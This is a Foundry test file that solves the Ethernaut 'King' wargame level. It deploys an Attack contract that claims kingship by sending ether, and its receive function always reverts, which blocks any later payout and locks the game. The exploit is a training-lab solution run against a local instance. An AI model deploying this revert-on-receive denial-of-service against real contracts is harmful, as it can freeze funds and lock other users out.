// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/King/KingFactory.sol";
import "../src/Ethernaut.sol";

contract KingTest is StdCheats, Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack{value: 1 ether}(payable(address(ethernautKing)));
        attack.attack(address(ethernautKing));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    address payable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function attack(address target) public {
        King king = King(payable(target));
        (bool success,) = address(king).call{value: 1 ether}("");
    }

    receive() external payable {
        revert();
    }
}
